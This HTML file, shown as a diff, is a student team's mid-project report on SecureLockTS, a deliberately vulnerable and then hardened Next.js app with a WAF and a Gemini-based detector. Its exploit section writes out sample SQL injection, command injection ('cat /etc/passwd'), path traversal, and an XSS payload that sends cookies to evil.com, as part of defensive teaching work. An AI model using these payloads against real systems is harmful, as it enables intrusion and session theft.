@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Mid-Project Status Report - SecureLockTS</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: 'Times New Roman', Times, serif;
+    font-size: 12pt;
+    line-height: 1.15;
+    color: #1a1a1a;
+    max-width: 8.5in;
+    margin: 0 auto;
+    padding: 1in;
+  }
+  h1 { font-size: 18pt; text-align: center; margin-bottom: 4pt; font-weight: bold; }
+  h2 { font-size: 14pt; margin-top: 18pt; margin-bottom: 6pt; font-weight: bold; border-bottom: 1px solid #333; padding-bottom: 3pt; }
+  h3 { font-size: 12pt; margin-top: 12pt; margin-bottom: 4pt; font-weight: bold; font-style: italic; }
+  p { margin-bottom: 8pt; text-align: justify; }
+  .center { text-align: center; }
+  .authors { text-align: center; font-size: 12pt; margin-bottom: 4pt; }
+  .date { text-align: center; font-size: 11pt; margin-bottom: 24pt; color: #555; }
+  ul, ol { margin-left: 24pt; margin-bottom: 8pt; }
+  li { margin-bottom: 3pt; }
+  table { width: 100%; border-collapse: collapse; margin: 8pt 0 12pt 0; font-size: 11pt; }
+  th, td { border: 1px solid #999; padding: 4pt 8pt; text-align: left; vertical-align: top; }
+  th { background-color: #e8e8e8; font-weight: bold; }
+  .screenshot { text-align: center; margin: 12pt 0; }
+  .screenshot img { max-width: 100%; border: 1px solid #ccc; border-radius: 3px; box-shadow: 0 2px 6px rgba(0,0,0,0.12); }
+  .caption { font-size: 10pt; color: #555; font-style: italic; margin-top: 4pt; text-align: center; }
+  .code { font-family: 'Courier New', Courier, monospace; font-size: 10pt; background: #f4f4f4; border: 1px solid #ddd; padding: 6pt 10pt; margin: 6pt 0 10pt 0; white-space: pre-wrap; display: block; border-radius: 3px; }
+  .page-break { page-break-before: always; }
+  @media print { body { padding: 0.75in; } }
+</style>
+</head>
+<body>
+
+<h1>Mid-Project Status Report</h1>
+<h1 style="font-size: 14pt; font-weight: normal; margin-bottom: 2pt;">SecureLockTS: A Self-Lockdown Application for Real-Time Attack Detection and Automated System Protection</h1>
+<p class="authors"><strong>Khushi, Taiba, Heer</strong></p>
+<p class="date">March 22, 2026</p>
+
+<!-- ===================================== -->
+<h2>1. Project Overview</h2>
+
+<p><strong>Project Title:</strong> SecureLockTS - A Self-Lockdown Application for Real-Time Attack Detection and Automated System Protection</p>
+
+<p><strong>Original Proposal Context:</strong> Contemporary web apps are increasingly vulnerable to cybersecurity threats, especially injection attacks and authentication bypasses which are top-listed in the OWASP Top 10:2025. Because conventional strategies tend to rely on external surveillance rather than built-in active defenses, our problem statement identified that many applications lack internal mechanisms to identify and halt attacks dynamically. Thus, our proposed objective was to design a self-lockdown web application in TypeScript that acts as both a vulnerable sandbox and a hardened defensive system, triggering automated system lock-outs upon detecting suspicious inputs.</p>
+
+<p><strong>Current Summary:</strong> Building strictly on that proposal, SecureLockTS has been successfully constructed as a Next.js (TypeScript) web application designed to demonstrate and defend against these exact vulnerabilities in real time. We have exceeded our initial algorithmic detection proposal by embedding a comprehensive 10-layer Web Application Firewall (WAF), an AI Sentinel powered by Google Gemini 2.5 Flash for behavioral payload analysis, per-IP attacker isolation, and a self-healing lockdown mechanism that successfully recovers from coordinated DDoS attacks.</p>
+
+<!-- ===================================== -->
+<h2>2. Progress Summary</h2>
+
+<h3>2.1 Application Architecture - The Dummy Website</h3>
+
+<p>To demonstrate the security system in a realistic context, we built a fully functional patriotic blog website styled after U.S. government websites like USAJobs.gov. The blog serves as the "dummy" application that our security system protects. It features a navy blue and white color scheme, serif typography (Merriweather), and professional government-inspired aesthetics.</p>
+
+<div class="screenshot">
+  <img src="screenshots/01_homepage.png" alt="Homepage">
+  <p class="caption">Figure 1: Application homepage - Government-styled blog with hero section, article cards, and official USAJobs-inspired design</p>
+</div>
+
+<div class="screenshot">
+  <img src="screenshots/02_national_anthem.png" alt="Blog Post - National Anthem">
+  <p class="caption">Figure 2: Blog post page - "The Star-Spangled Banner" with all 4 verses displaying in a navy blue section</p>
+</div>
+
+<div class="screenshot">
+  <img src="screenshots/09_blog_america.png" alt="Blog Post - Why We Love America">
+  <p class="caption">Figure 3: Blog post page - "Why We Love America" with themed sections on Freedom, Innovation, Diversity, and Generosity</p>
+</div>
+
+<div class="page-break"></div>
+
+<h3>2.2 Vulnerabilities Identified</h3>
+
+<p>Three core OWASP Top 10 vulnerabilities were deliberately introduced into the application and subsequently hardened with secure coding practices:</p>
+
+<table>
+  <tr><th>Vulnerability</th><th>OWASP Category</th><th>DREAD Score</th><th>Risk Level</th></tr>
+  <tr><td>SQL Injection (Authentication Bypass)</td><td>A03:2021 - Injection</td><td>42/50</td><td>CRITICAL</td></tr>
+  <tr><td>OS Command Injection</td><td>A03:2021 - Injection</td><td>48/50</td><td>CRITICAL</td></tr>
+  <tr><td>Cross-Site Scripting (Reflected XSS)</td><td>A03:2021 - Injection</td><td>36/50</td><td>HIGH</td></tr>
+</table>
+
+<h3>2.3 Code Sections Analyzed</h3>
+
+<p>The following critical code modules have been developed, analyzed, and hardened:</p>
+
+<ul>
+  <li><strong>Authentication API (/api/auth):</strong> Deliberately vulnerable to SQL injection with <code>' OR 1=1--</code> payloads. Hardened with parameterized queries, strict input validation (length limits, type checking), safe JSON parsing, and zero information leakage (generic error messages prevent user enumeration).</li>
+  <li><strong>Command Execution API (/api/command):</strong> Originally vulnerable to OS command injection via shell metacharacters. Hardened with a strict command whitelist, <code>execFile()</code> instead of <code>exec()</code>, per-command argument limits, 64KB maxBuffer, and sanitized error output.</li>
+  <li><strong>XSS Rendering API (/api/xss):</strong> Allows toggling between vulnerable (raw HTML rendering) and secure mode (HTML entity escaping). Hardened with default secure mode, input length validation, and DREAD score logging.</li>
+  <li><strong>Centralized Threat Detector (threat-detector.ts):</strong> Custom detection engine supporting 10+ attack vectors: SQLi, CMDi, XSS, path traversal, SSRF, LDAP injection, template injection, header injection, XXE, and automated scanner detection.</li>
+  <li><strong>WAF Middleware (middleware.ts):</strong> 10-layer edge middleware protecting every route (pages and APIs).</li>
+  <li><strong>AI Sentinel (ai.ts):</strong> Gemini 2.5 Flash integration with structured JSON response schema and automatic regex fallback.</li>
+  <li><strong>Security Store (store.ts):</strong> Per-IP reputation tracking, progressive rate limiting, automatic IP banning, and DDoS detection.</li>
+</ul>
+
+<h3>2.4 Static Analysis Results</h3>
+
+<p><strong>Tools Used:</strong></p>
+<ul>
+  <li>TypeScript Compiler (tsc) - strict mode, zero type errors across all 21 source files</li>
+  <li>Next.js Build Pipeline - full production build passing with all routes compiled</li>
+  <li>ESLint - configured with Next.js recommended rules</li>
+  <li>Manual Code Review - all API endpoints reviewed for OWASP Top 10 compliance</li>
+</ul>
+
+<p><strong>Build Output:</strong> 9 static pages pre-rendered, 8 dynamic server-rendered routes, 1 middleware proxy. No hardcoded secrets in source code (API key stored in <code>.env.local</code>). All user-facing error messages sanitized to prevent information leakage.</p>
+
+<div class="page-break"></div>
+
+<h3>2.5 Preliminary Exploit Discussion</h3>
+
+<p><strong>SQL Injection - How it could be exploited:</strong> An attacker submits <code>' OR 1=1--</code> as a username in the login form. Without parameterized queries, this modifies the SQL query to return all users, bypassing authentication entirely. <strong>Impact:</strong> Complete authentication bypass, unauthorized access to all user accounts, potential data exfiltration. <strong>DREAD Score: 42/50 (CRITICAL).</strong></p>
+
+<p><strong>Command Injection - How it could be exploited:</strong> An attacker submits <code>; cat /etc/passwd</code> as a system command. Without input sanitization, the shell interprets the semicolon as a command separator, executing arbitrary OS commands. <strong>Impact:</strong> Full server compromise, remote code execution, data theft, lateral movement. <strong>DREAD Score: 48/50 (CRITICAL).</strong></p>
+
+<p><strong>XSS - How it could be exploited:</strong> An attacker injects <code>&lt;script&gt;document.location='https://evil.com/?c='+document.cookie&lt;/script&gt;</code> into a form field. Without HTML escaping, the browser executes the script, stealing session cookies. <strong>Impact:</strong> Session hijacking, credential theft, phishing, defacement. <strong>DREAD Score: 36/50 (HIGH).</strong></p>
+
+<h3>2.6 Mitigation Planning</h3>
+<p>Our mitigation strategy transcends mere patching; it embodies a holistic, defense-in-depth architecture designed for zero-trust environments. Recognizing that user input is inherently adversarial, we implemented a zero-tolerance policy across all parsing boundaries. For SQL injection, we moved entirely away from string-concatenation-based database queries, adopting strictly parameterized Prepared Statements via the native SQLite3 driver. This architectural shift guarantees that input payloads are treated exclusively as literal string literals, mathematically eliminating the possibility of logic subversion regardless of the payload complexity.</p>
+<p>Similarly, for OS Command Injection, we fundamentally altered the execution paradigm. Instead of relying on the dangerously permissive <code class="code">child_process.exec()</code>, which spins up a full system shell capable of interpreting metacharacters like semicolons and pipes, we transitioned strictly to <code class="code">child_process.execFile()</code>. This directly invokes the target binary, treating all subsequent inputs strictly as command-line arguments rather than evaluable bash syntax. Combined with a hardcoded whitelist of permitted commands and strict maximum buffer limits (64KB), the application is now impervious to arbitrary command execution attempts.</p>
+<h3>2.6 Mitigation Planning - Secure Coding Fixes Implemented</h3>
+
+<table>
+  <tr><th>Vulnerability</th><th>Mitigation</th><th>Status</th></tr>
+  <tr><td>SQL Injection</td><td>Parameterized queries, input validation, length limits, AI analysis</td><td>✅ Implemented</td></tr>
+  <tr><td>Command Injection</td><td>Command whitelist, execFile(), argument limits, buffer limits</td><td>✅ Implemented</td></tr>
+  <tr><td>XSS</td><td>HTML entity escaping (default), input length limits, CSP headers</td><td>✅ Implemented</td></tr>
+  <tr><td>All Routes</td><td>10-layer WAF middleware on every page and API, 7 security headers</td><td>✅ Implemented</td></tr>
+  <tr><td>AI Sentinel</td><td>Gemini 2.5 Flash behavioral analysis on all API payloads</td><td>✅ Active</td></tr>
+  <tr><td>Per-IP Isolation</td><td>Individual attackers banned after 3 strikes; global lockdown only for DDoS</td><td>✅ Implemented</td></tr>
+  <tr><td>Self-Healing</td><td>Automatic 5-minute recovery from lockdown; admin manual reset available</td><td>✅ Implemented</td></tr>
+</table>
+
+<!-- ===================================== -->
+<h3>2.7 Security Features - Evidence of Progress</h3>
+
+<h3>2.7.1 Administrator Authentication & Access Control</h3>
+
+<p>The Sentinel Core security monitoring dashboard is restricted to administrators only. Unauthenticated users are shown an "Access Restricted" page with a redirect to the login portal. This demonstrates the principle of <strong>Least Privilege</strong> - only authorized personnel can view security logs and system status.</p>
+
+<div class="screenshot">
+  <img src="screenshots/04_sentinel_restricted.png" alt="Sentinel Access Restricted">
+  <p class="caption">Figure 4: Sentinel Core access denied - Non-admin users see "Access Restricted" with a "Sign In as Admin" redirect</p>
+</div>
+
+<div class="screenshot">
+  <img src="screenshots/03_login_empty.png" alt="Login Page">
+  <p class="caption">Figure 5: Administrator Sign In portal - Navy blue header, clean form design, security monitoring notice</p>
+</div>
+
+<div class="screenshot">
+  <img src="screenshots/05_login_auth.png" alt="Login Authenticating">
+  <p class="caption">Figure 6: Admin authentication in progress - Demonstrating the login flow with "Authenticating..." feedback</p>
+</div>
+
+<div class="page-break"></div>
+
+<h3>2.7.2 Sentinel Core Dashboard - Real-Time Security Monitoring</h3>
+
+<p>After logging in as administrator, the Sentinel Core dashboard provides real-time visibility into the system's security posture. It displays the Core Integrity status, Threat Intel Matrix (anomalies, blocked attacks, self-heals, banned IPs), CPU and memory load, and a live syslog feed showing every detected attack with timestamps, source IPs, and DREAD risk scores.</p>
+
+<div class="screenshot">
+  <img src="screenshots/06_sentinel_dashboard.png" alt="Sentinel Dashboard Full">
+  <p class="caption">Figure 7: Sentinel Core dashboard (Government Light Theme) - Core Integrity status "ALERT" after catching 3 anomalies. Threat Intel Matrix shows 3 blocked attacks and 1 permanently banned IP.</p>
+</div>
+
+<div class="screenshot">
+  <img src="screenshots/07_sentinel_logs.png" alt="Sentinel Logs Scrolled">
+  <p class="caption">Figure 8: Sentinel live feed - Detailed view showing the exact moment the attacker IP was permanently banned after triggering 3 SQL injection alerts (DREAD 8.8).</p>
+</div>
+
+<div class="page-break"></div>
+
+<h3>2.7.3 Attack Detection Evidence - Diverse Threats & Global Lockdown</h3>
+
+<p>The Sentinel dashboard's Syslog Live Feed provides real-time visibility into all network security events. As demonstrated in the system logs, the WAF is capable of detecting and mitigating a wide variety of attack vectors dynamically:</p>
+
+<ul>
+    <li><strong>Diverse Threat Signatures:</strong> The system successfully intercepts attacks ranging from Path Traversal (e.g., <code>../../etc/passwd</code>) and XSS, to Command Injection payloads.</li>
+    <li><strong>AI Sentinel Reasoning:</strong> For highly obfuscated payloads that bypass traditional static regex filters, Gemini 2.5 Flash acts as a fallback inference engine to analyze intent and block malicious inputs contextually.</li>
+</ul>
+
+<div class="screenshot">
+  <img src="screenshots/13_diverse_threats_and_lockdown.png" alt="Sentinel Diverse Threats and Lockdown Log">
+  <p class="caption">Figure 9: Sentinel live feed showing the detection of diverse threats alongside a severe Global Lockdown event and subsequent Self-Heal cycle.</p>
+</div>
+
+<h3>2.7.4 Coordinated DDoS Defense & Self-Healing</h3>
+
+<p>A core feature of the SecureLock perimeter defense is its ability to identify volumetric and coordinated attacks. When the system detects attacks originating from 10 or more distinct IP addresses exceeding a 50-attack threshold within a short window, it enacts a <strong>GLOBAL LOCKDOWN</strong>.</p>
+<p>During a global lockdown, the entire application immediately offline for all users, displaying a localized "Service Temporarily Unavailable" intercept screen. This completely protects the database and backend infrastructure from exhaustion.</p>
+<p>Once the 5-minute cooldown period expires, the Sentinel initiates a <strong>SYSTEM HEALED</strong> cycle. The application comes back online automatically for legitimate traffic, while the specific malicious attacker IPs remain permanently banned in the edge firewall.</p>
+
+<div class="screenshot">
+  <img src="screenshots/14_lockdown_public_screen.png" alt="Public Global Lockdown Screen">
+  <p class="caption">Figure 10: The public-facing Global Lockdown screen served to all users during a coordinated DDoS attack, showing the auto-recovery countdown.</p>
+</div>
+
+<h3>2.7.4 AI Sentinel - Gemini 2.5 Flash Behavioral Analysis</h3>
+
+<p>The AI Sentinel uses Google's Gemini 2.5 Flash model to analyze every API payload. It returns a structured JSON response with three fields: <code>isMalicious</code> (boolean), <code>confidence</code> (0-100%), and <code>reasoning</code> (technical explanation). This provides a second layer of defense that catches obfuscated attacks that bypass static regex patterns.</p>
+
+<p><strong>AI Analysis Flow:</strong></p>
+<ol>
+  <li><strong>Pre-filter:</strong> Pure alphanumeric inputs skip AI entirely (100% safe - saves API quota)</li>
+  <li><strong>Static Detection:</strong> Regex engine checks for 10+ known attack patterns</li>
+  <li><strong>AI Evaluation:</strong> Gemini 2.5 Flash receives the payload with context and returns a verdict</li>
+  <li><strong>Fallback:</strong> If AI is offline, automatic regex fallback activates (never fails open)</li>
+</ol>
+
+<p><strong>Example AI Response (Blind SQL Injection):</strong></p>
+<span class="code">{
+  "isMalicious": true,
+  "confidence": 98,
+  "reasoning": "The payload contains ' OR username LIKE '%a%', which is a clear SQL Injection
+   attempt designed to bypass authentication by manipulating the WHERE clause of an SQL query.
+   The presence of single quotes and SQL keywords indicates malicious intent."
+}</span>
+
+<div class="screenshot">
+  <img src="screenshots/15_official_ai_syslog.png" alt="AI Sentinel Reasoning Box">
+  <p class="caption">Figure 11: Real-time demonstration of the AI Sentinel analyzing an obfuscated blind SQL injection attempt. The Gemini 2.5 Flash model natively halts the execution and provides a contextual technical explanation directly in the monitoring dashboard.</p>
+</div>
+
+<div class="page-break"></div>
+
+<h3>2.7.5 WAF Middleware - 10-Layer Edge Protection</h3>
+
+<p>Every request - both pages and APIs - passes through a 10-layer Web Application Firewall running at the network edge before reaching application code:</p>
+
+<table>
+  <tr><th>Layer</th><th>Protection</th><th>Scope</th></tr>
+  <tr><td>1</td><td>HTTP verb filtering (only GET/POST/PUT/DELETE/OPTIONS/HEAD)</td><td>All routes</td></tr>
+  <tr><td>2</td><td>Scanner/bot UA blocking (20+ tools: sqlmap, nikto, nmap, etc.)</td><td>All routes</td></tr>
+  <tr><td>3</td><td>Missing/short User-Agent check</td><td>API routes</td></tr>
+  <tr><td>4</td><td>URL encoding validation (malformed %xx rejection)</td><td>All routes</td></tr>
+  <tr><td>5</td><td>URI length constraint (2000 char max - buffer exhaustion prevention)</td><td>All routes</td></tr>
+  <tr><td>6</td><td>Dangerous URL pattern detection (path traversal, .env, .git, wp-admin)</td><td>All routes</td></tr>
+  <tr><td>7</td><td>Query string attack detection (SQLi, XSS, CMDi in URL params)</td><td>All routes</td></tr>
+  <tr><td>8</td><td>Host header injection prevention</td><td>All routes</td></tr>
+  <tr><td>9</td><td>Content-Type validation (POST/PUT/DELETE)</td><td>All routes</td></tr>
+  <tr><td>10</td><td>Cross-origin POST validation</td><td>API routes</td></tr>
+</table>
+
+<p><strong>Security Headers Applied to Every Response:</strong></p>
+<table>
+  <tr><th>Header</th><th>Value</th></tr>
+  <tr><td>Content-Security-Policy</td><td>default-src 'self'; frame-ancestors 'none'; form-action 'self'</td></tr>
+  <tr><td>Strict-Transport-Security</td><td>max-age=31536000; includeSubDomains; preload</td></tr>
+  <tr><td>X-Frame-Options</td><td>DENY</td></tr>
+  <tr><td>X-Content-Type-Options</td><td>nosniff</td></tr>
+  <tr><td>X-XSS-Protection</td><td>1; mode=block</td></tr>
+  <tr><td>Referrer-Policy</td><td>strict-origin-when-cross-origin</td></tr>
+  <tr><td>Permissions-Policy</td><td>camera=(), microphone=(), geolocation=(), payment=()</td></tr>
+</table>
+
+<h3>2.7.6 Per-IP Isolation - 100% Uptime for Legitimate Users</h3>
+
+<p>A critical architectural decision was to isolate attackers per-IP rather than locking down the entire site. This ensures 100% uptime for legitimate users even while under attack:</p>
+
+<table>
+  <tr><th>Scenario</th><th>Response</th><th>Users Affected</th></tr>
+  <tr><td>Single attacker (1-2 attacks)</td><td>Logged, tarpitted 5s delay</td><td>Only the attacker</td></tr>
+  <tr><td>Repeat attacker (3+ from same IP)</td><td>IP permanently banned → rickrolled</td><td>Only that IP</td></tr>
+  <tr><td>Progressive repeat offender</td><td>Tighter rate limits (5 req/10s)</td><td>Only that IP</td></tr>
+  <tr><td>Coordinated DDoS (10+ IPs, 50+ attacks/min)</td><td>Global lockdown + 5-min auto-heal</td><td>All users (last resort)</td></tr>
+</table>
+
+<div class="screenshot">
+  <img src="screenshots/12_global_ip_ban.png" alt="Global IP Ban Overlay">
+  <p class="caption">Figure 12: Global IP Ban Defense - Malicious IPs are completely locked out of the entire application, displaying a red "THREAT NEUTRALIZED" terminal screen.</p>
+</div>
+
+<div class="page-break"></div>
+
+<h2>3. Challenges and Adjustments</h2>
+<p>The journey from conceptual proposal to a robust, self-healing production application was fraught with significant engineering hurdles that tested our architectural assumptions and implementation capabilities. One of the most persistent bottlenecks involved the orchestration of natively compiled dependencies within the Node.js ecosystem. Specifically, integrating the `sqlite3` driver required local compilation against the host operating system using node-gyp. This introduced cross-platform compatibility issues, as the build chain behaved divergently across MacOS, Linux, and Windows environments, necessitating dynamic rebuild scripts in our package initialization chain.</p>
+<p>Another profound conceptual challenge was the mitigation of Race Conditions within the global lockdown implementation. In a highly parallelized, asynchronous environment processing hundreds of concurrent requests, our initial naive implementation of the threat counter was subject to Time-of-Check to Time-of-Use (TOCTOU) vulnerabilities. Multiple requests could evaluate the threshold simultaneously before any had incremented it, allowing a momentary flood of traffic to bypass the lockdown gate. Resolving this required implementing an atomic, centralized state store ensuring thread-safe increments and instantaneous application of the lockdown boolean across the edge computing boundaries.</p>
+
+<h3>3.1 Technical Challenges</h3>
+
+<ul>
+  <li><strong>SQLite Native Bindings:</strong> The <code>sqlite3</code> package required native compilation via <code>npm rebuild sqlite3</code> after initial installation - a known issue with Node.js native addons.</li>
+  <li><strong>TypeScript Strict Mode:</strong> Maintaining type safety across security functions was challenging. A type mismatch between <code>ThreatSeverity</code> and <code>LogEntry.severity</code> caused a build failure requiring careful type alignment across modules.</li>
+  <li><strong>Per-IP vs. Global Lockdown Balance:</strong> Our original design used a global lockdown after 3 attacks. This was overly aggressive - a single attacker could effectively DoS the site for all users. We redesigned the model to isolate individual attackers (per-IP banning) while reserving global lockdown exclusively for coordinated DDoS attacks (10+ distinct attacker IPs and 50+ attacks within 60 seconds).</li>
+  <li><strong>Middleware Coverage Gap:</strong> We initially only applied the WAF middleware to API routes, leaving page routes unprotected. This was a significant oversight discovered during security review and resolved by expanding the middleware matcher to cover all routes.</li>
+  <li><strong>AI Rate Limiting:</strong> The Gemini API has token limits, so we implemented a pre-filter that bypasses AI for alphanumeric-only inputs (mathematically safe) to conserve quota for genuinely suspicious payloads.</li>
+</ul>
+
+<h3>3.2 Scope Adjustments</h3>
+
+<ul>
+  <li><strong>AI Integration:</strong> The original proposal mentioned basic regex detection. We added Google Gemini 2.5 Flash for LLM-powered behavioral analysis, significantly improving detection accuracy for obfuscated attacks.</li>
+  <li><strong>PASTA/DREAD Models:</strong> Formal threat modeling frameworks were incorporated into code documentation and the vulnerability report.</li>
+  <li><strong>Self-Healing Architecture:</strong> Automatic recovery mechanism was not in the original proposal but added to demonstrate resilience engineering.</li>
+  <li><strong>Frontend Redesign:</strong> The application frontend was redesigned with a government-inspired aesthetic to create a realistic dummy web application, replacing the original technical dashboard.</li>
+</ul>
+
+<!-- ===================================== -->
+<h2>4. Updated Timeline</h2>
+
+<table>
+  <tr><th>Phase</th><th>Dates</th><th>Status</th><th>Deliverable</th></tr>
+  <tr><td>Phase 1: Research &amp; Proposal</td><td>Feb 23 - Mar 8</td><td>✅ Complete</td><td>Project Proposal, Initial Research</td></tr>
+  <tr><td>Phase 2: Vulnerable Application</td><td>Mar 8 - Mar 15</td><td>✅ Complete</td><td>3 Vulnerable APIs (SQLi, CMDi, XSS)</td></tr>
+  <tr><td>Phase 3: Detection &amp; Defense</td><td>Mar 15 - Mar 22</td><td>✅ Complete</td><td>WAF, AI Sentinel, Per-IP Isolation, Self-Healing</td></tr>
+  <tr><td>Phase 4: Testing &amp; Validation</td><td>Mar 22 - Apr 5</td><td>🔄 In Progress</td><td>Automated test bench, penetration testing, benchmarks</td></tr>
+  <tr><td>Phase 5: Final Report &amp; Presentation</td><td>Apr 5 - Apr 19</td><td>⏳ Upcoming</td><td>Final report, live demo, documentation</td></tr>
+</table>
+
+<p><strong>Adjustments:</strong> Phase 3 was completed slightly ahead of schedule. Because this is our mid-project submission, we have essentially completed the first 50% of our proposed scope. There is exactly <strong>50% more remaining</strong> to accomplish over the next three weeks, focusing deeply on automated penetration testing, security benchmarks, and our final presentation.</p>
+
+<!-- ===================================== -->
+<h2>5. References</h2>
+
+<ul>
+  <li>Bathgate, R. (2026, February 17). <em>The vast majority of breaches are enabled by preventable gaps and identity weaknesses, says Palo Alto Networks</em>. IT Pro. https://www.itpro.com/security/cyber-attacks/vast-majority-breaches-enabled-preventable-gaps-identity-weaknesses-palo-alto-networks</li>
+  <li>Google. (2025). <em>Gemini REST API References &amp; Generative AI Implementation Models</em>. Google Cloud Documentation. https://ai.google.dev/docs</li>
+  <li>Kobie, N. (2025, August 26). <em>74% of companies admit insecure code caused a security breach</em>. IT Pro. https://www.itpro.com/security/74-percent-of-companies-admit-insecure-code-caused-a-security-breach</li>
+  <li>MITRE. (2025). <em>Common Weakness Enumeration (CWE): Top 25 Most Dangerous Software Weaknesses</em>. https://cwe.mitre.org/top25/</li>
+  <li>National Institute of Standards and Technology (NIST). (2024). <em>Secure Software Development Framework (SSDF) Version 1.1</em> (NIST Special Publication 800-218). https://csrc.nist.gov/publications/detail/sp/800-218/final</li>
+  <li>OWASP Foundation. (2025). <em>OWASP Top 10:2025 RC1 - A05: Injection</em>. https://owasp.org/Top10/2025/A05_2025-Injection/</li>
+  <li>Shostack, A. (2014). <em>Threat Modeling: Designing for Security</em> (1st ed.). John Wiley &amp; Sons.</li>
+  <li>Software Engineering Institute (SEI). (2025). <em>CERT C++ and TypeScript Secure Coding Standard</em>. Carnegie Mellon University. https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=88046682</li>
+  <li>Sonar. (2025). <em>Advanced code security tool for developers with SonarQube</em>. https://www.sonarsource.com/solutions/security/</li>
+</ul>
+
+</body>
+</html>
